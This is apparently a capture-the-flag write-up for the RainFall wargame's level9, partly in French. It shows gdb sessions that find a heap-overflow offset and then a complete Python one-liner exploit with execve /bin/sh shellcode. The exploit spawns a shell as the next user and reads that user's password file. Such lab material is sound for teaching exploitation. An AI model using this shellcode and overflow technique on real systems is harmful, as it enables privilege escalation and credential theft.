```
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Breakpoint 1, 0x0804867c in main ()
(gdb) c
Continuing.
```
the pattern ```0x0804867c``` is not found but we can see that is realocated in the registre eax
```
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) i r eax
eax            0x41366441       1094083649
(gdb) 
```
the pattern ```0x41366441``` overflow at the offset 108

```
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   ...
> b *0x0804867c
> i r
> x $eax
```

dereference esp+10 dans eax = endroit de l'overflow
ni
``
0804a00c = debut du payload

[0804a00c+4 pour pointer sur le shellcode juste apres] [shellcode pointe par 0804a00c+4]

 [padding de 83 jusqu'au 0804a00c+108] [0804a00c (pointeur sur le debut du payload)]``

```
level9@RainFall:~$ ./level9 $(python -c "print '\x08\x04\xa0\x10'[::-1] + '\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80' + 'A'*83 + '\x08\x04\xa0\x0c'[::-1]") 
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```